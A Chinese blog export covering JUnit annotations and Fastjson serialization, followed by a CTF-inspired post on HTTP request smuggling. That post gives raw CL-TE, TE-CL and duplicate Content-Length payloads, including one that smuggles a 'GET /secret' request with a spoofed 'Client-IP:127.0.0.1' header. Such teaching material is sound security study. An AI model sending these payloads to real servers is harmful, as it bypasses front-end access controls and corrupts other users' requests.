<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Test(expected = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            array[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当代码出现异常的时候，则不会抛出异常，相反的，如果这段代码正常抛出，就会抛出异常了。</p>
<h2 id="beforeclass，afterclass"><a href="#beforeclass，afterclass" class="headerlink" title="beforeclass，afterclass"></a>beforeclass，afterclass</h2><ul>
<li>BeforeClass: 在所有类被执行之前执行，只会执行一次，同时必须为static静态方法（因为他们就相当于此）</li>
<li>AfterClass: 在所有类被执行之后执行</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我就相当于构造器！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是test1，我被执行了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我之后才会被执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test(expected = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            array[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是test2执行了！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@BeforeClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">beforeClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我在所有的前面被执行，并且我只会执行一次！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">afterClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我在最终所有结束之后才会被执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Ignore"><a href="#Ignore" class="headerlink" title="Ignore"></a>Ignore</h2><ul>
<li>Ignore可以让我们暂时的禁用特定的类，被注解之后的类将不再被执行</li>
</ul>
<p>Ignore经过我测试，只有当他放在测试类前才可以生效。</p>
<p>例子：</p>
<p><img src="image-20201102165311512.png" alt="image-20201102165311512"></p>
<p>而如果我们放在其他类前面：</p>
<p><img src="image-20201102165351821.png" alt="image-20201102165351821"></p>
<p>我们可以发现依然被执行了！</p>
<h2 id="Runwith"><a href="#Runwith" class="headerlink" title="Runwith"></a>Runwith</h2><ul>
<li>Runwith放在测试类之前，用于确定这个类该如何运行，我们也可以不标注，将会使用默认的运行容器</li>
</ul>
<p>可以看这篇文章来理解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;my.oschina.net&#x2F;itblog&#x2F;blog&#x2F;1550753?tdsourcetag&#x3D;s_pcqq_aiomsg</span><br></pre></td></tr></table></figure>



<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><ul>
<li><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p>
</li>
<li><p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p>
</li>
<li><p>Fastjson 源码地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
</li>
<li><p>Fastjson 中文 Wiki：<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p>
</li>
<li><p>也就是说，程序员们用这个程序就是为了传运JSON格式的对象，呃，感觉像序列化一样了？</p>
</li>
</ul>
<h2 id="将JAVA对象转换成json格式"><a href="#将JAVA对象转换成json格式" class="headerlink" title="将JAVA对象转换成json格式"></a>将JAVA对象转换成json格式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fortest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;JavaToJson&gt; listOfJava = <span class="keyword">new</span> ArrayList&lt;JavaToJson&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">18</span>,<span class="string">&quot;wndmd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">        listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">20</span>,<span class="string">&quot;Json!&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String list = JSON.toJSONString(listOfJava);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意，上述代码需要另外起一个类，test不允许在有参构造的类中出现</p>
<p>得到输出结果：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;<span class="attr">&quot;Age&quot;</span>:<span class="number">18</span>,</span><br><span class="line">     <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1604309562809</span>,</span><br><span class="line">     <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1604309562809</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>我们还可以格式化自定义输出，控制字段的排序。</p>
<p>我们更新bean并添加如下字段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaToJson</span> </span>&#123;</span><br><span class="line">    <span class="meta">@JSONField(name = &quot;Age&quot;,serialize = false)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JSONField(name = &quot;FULL NAME&quot;,ordinal = 2)</span></span><br><span class="line">    <span class="keyword">private</span> String fullName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JSONField(name = &quot;DATE OF BIRTH&quot;,format = &quot;dd/MM/yyyy&quot;,ordinal = 1)</span></span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br></pre></td></tr></table></figure>

<p>注意在这里我们添加serialize = false，这里是默认我们添加序列化，如果我们设置为false，该字段将不会被显示。</p>
<p>而ordinal，则是用于规定格式化的顺序，需要注意的是，如果你想控制，最好就全部都使用该属性修饰，或者你自己干脆写的时候就从上向下写，不然的话，默认从上向下执行，只会再按照ordinal限定的顺序排列</p>
<p>上述代码输出：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">     	<span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line"> 	&#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>如果将serialize的false去掉之后，他还是第一个被执行：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">18</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="作用对象"><a href="#作用对象" class="headerlink" title="作用对象"></a>作用对象</h2><p>@JSONField 的作用对象:</p>
<ul>
<li><ol>
<li>Field</li>
</ol>
</li>
<li><ol start="2">
<li>Setter 和 Getter 方法</li>
</ol>
</li>
</ul>
<p>需要注意如下两点：</p>
<p><strong>注意：</strong>FastJson 在进行操作时，是根据 getter 和 setter 的方法进行的，并不是依据 Field 进行。</p>
<p><strong>注意：</strong>若属性是私有的，必须有 set 方法。否则无法反序列化。</p>
<p>跟进JSONField查看源码，可以知道我们允许指定很多东西=。=：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> JSONField &#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">ordinal</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">format</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">serialize</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">true</span></span>;</span><br><span class="line">	<span class="comment">//注意这里，反序列化！</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">deserialize</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">true</span></span>;</span><br><span class="line"></span><br><span class="line">    SerializerFeature[] serialzeFeatures() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    Feature[] parseFeatures() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">label</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">jsonDirect</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; serializeUsing() <span class="keyword">default</span> Void.class;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; deserializeUsing() <span class="keyword">default</span> Void.class;</span><br><span class="line"></span><br><span class="line">    String[] alternateNames() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">unwrapped</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">defaultValue</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="配置方式"><a href="#配置方式" class="headerlink" title="配置方式"></a>配置方式</h2><p>FieldInfo 可以配置在 getter/setter 方法或者字段上。例如：</p>
<h3 id="配置在-getter-setter-上"><a href="#配置在-getter-setter-上" class="headerlink" title="配置在 getter/setter 上"></a>配置在 getter/setter 上</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"> </span><br><span class="line">      <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> id;&#125;</span><br><span class="line">      <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;<span class="keyword">this</span>.id = id;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="配置在-field-上"><a href="#配置在-field-上" class="headerlink" title="配置在 field 上"></a>配置在 field 上</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">     <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> id;&#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;<span class="keyword">this</span>.id = id;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="创建-JSON-对象"><a href="#创建-JSON-对象" class="headerlink" title="创建 JSON 对象"></a>创建 JSON 对象</h2><p>创建 JSON 对象非常简单，只需使用 JSONObject（fastJson提供的json对象） 和 JSONArray（fastJson提供json数组对象） 对象即可。</p>
<p>虽然JSONArryay也可以创建一个JSON对象，但我觉得书写方式不够美观，其中如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whenGenerateJson_thanGenerationCorrect</span><span class="params">()</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">    JSONArray jsonArray = <span class="keyword">new</span> JSONArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        JSONObject jsonObject = <span class="keyword">new</span> JSONObject();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;AGE&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;FULL NAME&quot;</span>, <span class="string">&quot;Doe &quot;</span> + i);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;DATE OF BIRTH&quot;</span>, <span class="string">&quot;2016/12/12 12:12:12&quot;</span>);</span><br><span class="line">        jsonArray.add(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">    String jsonOutput = jsonArray.toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JSON-字符串转换为-Java-对象"><a href="#JSON-字符串转换为-Java-对象" class="headerlink" title="JSON 字符串转换为 Java 对象"></a>JSON 字符串转换为 Java 对象</h2><p>fastjson允许我们可以将前端传来的数据转换变成JSON数据，同样的也允许我们把后端数据转换为JSON字符串丢给前端。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jsonToJava</span><span class="params">()</span></span>&#123;</span><br><span class="line">        JavaToJson miaomiaomiao = <span class="keyword">new</span> JavaToJson(<span class="number">21</span>, <span class="string">&quot;miaomiaomiao&quot;</span>, <span class="keyword">new</span> Date());</span><br><span class="line">        String jsonObject = JSON.toJSONString(miaomiaomiao);</span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line"><span class="comment">//        这前面的part我们将数据转换成了JSON数据</span></span><br><span class="line">        JavaToJson newJavaObject = JSON.parseObject(jsonObject,JavaToJson.class);</span><br><span class="line"><span class="comment">//        指定需要转换的JSON字符串，并且指定原型,这样的话一个JAVA对象就指定好了</span></span><br><span class="line">        System.out.println(newJavaObject.getAge());</span><br><span class="line">        System.out.println(newJavaObject.getFullName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用ContextValuFilter配置JSON转换"><a href="#使用ContextValuFilter配置JSON转换" class="headerlink" title="使用ContextValuFilter配置JSON转换"></a>使用ContextValuFilter配置JSON转换</h3><p>在有些场景中，对Value做过滤，需要获得所述JavaBean的信息，而我们可能想要过滤某些信息，便可以使用该方法进行操作了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Before</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">      listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">31</span>,<span class="string">&quot;wdnmd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">      listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">33</span>,<span class="string">&quot;wd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">givenContextFilter_whenJavaObject_thanJsonCorrect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      ContextValueFilter valueFilter = <span class="keyword">new</span> ContextValueFilter () &#123;</span><br><span class="line">          <span class="function"><span class="keyword">public</span> Object <span class="title">process</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">                  BeanContext context, Object object, String name, Object value)</span> </span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (name.equals(<span class="string">&quot;DATE OF BIRTH&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="string">&quot;NOT TO DISCLOSE&quot;</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (value.equals(<span class="string">&quot;wdnmd&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> ((String) value).toUpperCase();</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      String jsonOutput = JSON.toJSONString(listOfJava, valueFilter);</span><br><span class="line">      System.out.println(jsonOutput);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>经过上述代码的操作，我们的时间将会修改为NOT TO DISCLOSE，并且数据中不包含wdnmd的将会被过滤,具体输出如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span>,<span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wdnmd&quot;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">     &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Java</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>http走私</title>
    <url>/2021/02/07/http%E8%B5%B0%E7%A7%81/</url>
    <content><![CDATA[<p>也是在Hgame里面遇见了才学习到，http走私产生的原因很简单，就是因为HTTP协议提供两种方式来决定结束的方式，分别有 <code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头，Content-Lenth我们一般见得多，它以字节为单位指定消息内容体的长度，例如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Cookie</span>: session=5n2xRNXtAYM9teOEn3jSkEDDabLe0Qv8</span><br><span class="line"><span class="attribute">Content-Length</span>: 35</span><br><span class="line">a=11</span><br></pre></td></tr></table></figure>

<p><code>Transfer-Encoding</code>标头用于指定消息体使用分块编码（Chunked Encode），也就是说消息报文由一个或多个数据块组成，每个数据块大小以字节为单位（十六进制表示） 衡量，后跟换行符，然后是块内容，最重要的是：整个消息体以大小为0的块结束，也就是说解析遇到0数据块就结束。如：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">b</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">a=11</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure>

<p>其实理解起来漏洞真的很简单，就是前后端对于HTTP结束的规定不同，比如前端可能读取到Content-Length就认为这段请求结束了，而整个请求包被发送过去的时候后端读取到了Transfer-Encoding，认为到这结束，所以两者就处理不同了。</p>
<p>那么就可能产生如下几种不同情况：</p>
<h3 id="前端处理Content-Length-后端不处理"><a href="#前端处理Content-Length-后端不处理" class="headerlink" title="前端处理Content-Length,后端不处理"></a>前端处理Content-Length,后端不处理</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Content-Length</span>: 77</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/secret</span>  <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> police.liki.link</span><br><span class="line"><span class="attribute">Client-IP:127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p>在这种情况下，前端处理到Content-Lenth之后就会停下，但是后端并不会，继续处理后半段的请求。</p>
<h3 id="前后端处理CL方式不同"><a href="#前后端处理CL方式不同" class="headerlink" title="前后端处理CL方式不同"></a>前后端处理CL方式不同</h3><p>当请求中出现两个CL的时候，前后端的处理方式不同也会导致漏洞诞生，例子：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Content-Length</span>: 89</span><br><span class="line"><span class="attribute">Content-Length</span>: 90</span><br><span class="line"></span><br><span class="line">(中间略过)</span><br><span class="line"><span class="attribute">123456</span></span><br><span class="line"><span class="attribute">78</span></span><br></pre></td></tr></table></figure>

<p>假设到78前面正好为89个字符的话，比如像这样一个请求，前端读取第一个CL认为请求体包括了<code>12345\r\na</code>，而后端读取第二个CL，认为请求体只包括到了<code>12345\r\n</code>。于是后面的<code>a</code>就到了缓冲区之中，当又有用户进行这样一个访问时：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Content-Length</span>: 77</span><br></pre></td></tr></table></figure>

<p>就会产生不存在aPOST这种访问方式的错误了</p>
<h3 id="在http请求中存在CL和TE-Transfer-Encoding-，前端只处理的是CL，后端只处理TE（CL-TE）"><a href="#在http请求中存在CL和TE-Transfer-Encoding-，前端只处理的是CL，后端只处理TE（CL-TE）" class="headerlink" title="在http请求中存在CL和TE(Transfer-Encoding)，前端只处理的是CL，后端只处理TE（CL-TE）"></a>在http请求中存在CL和TE(Transfer-Encoding)，前端只处理的是CL，后端只处理TE（CL-TE）</h3><p>在<code>Transfer-Encoding: chunked</code>下数据格式是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>

<p>分块大小的值在前，后面是分块数据。当到尾部时，分块大小的值为0，然后以<code>\r\n\r\n</code>结束</p>
<p><a href="http://shifeng-kaze.cn/blog/hgame2021_web_wp/0b37e16790f1a6bfa7d1cd5c27c7c263.png"><img src="http%E8%B5%B0%E7%A7%81/0b37e16790f1a6bfa7d1cd5c27c7c263.png" alt="img"></a></p>
<p>像这样的一个请求，前端处理CL后认为请求体为6，包括<code>0\r\n\r\nG</code>。而后端处理TE后，检测到<code>0\r\n\r\n</code>就认为这个请求已经结束了，<code>G</code>就进入了缓冲区。结果就是再发送一个正常的POST请求进来，就会出现没有<code>GPOST</code>请求的错误</p>
<h3 id="前端只处理TE，后端只处理CL（TE-CL）"><a href="#前端只处理TE，后端只处理CL（TE-CL）" class="headerlink" title="前端只处理TE，后端只处理CL（TE-CL）"></a>前端只处理TE，后端只处理CL（TE-CL）</h3><p><a href="http://shifeng-kaze.cn/blog/hgame2021_web_wp/6799a8f91dc52f6aa355219bb90435aa.png"><img src="http%E8%B5%B0%E7%A7%81/6799a8f91dc52f6aa355219bb90435aa.png" alt="img"></a></p>
<p>像这个请求，前端接受后检测到<code>0\r\n\r\n</code>后才认为请求结束，于是就把<code>12\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n</code>认为是属于请求体的。而后端根据CL值，认为<code>12\r\n</code>请求就结束了，于是连续访问后就会出现没有<code>GPOST</code>请求的错误</p>
<h3 id="前后端都处理TE"><a href="#前后端都处理TE" class="headerlink" title="前后端都处理TE"></a>前后端都处理TE</h3><p>这时虽然处理相同了，但我们可以通过对TE进行混淆，使得其中一个服务器不处理TE，结果造成<code>TE-CL</code>/<code>CL-TE</code>的http走私</p>
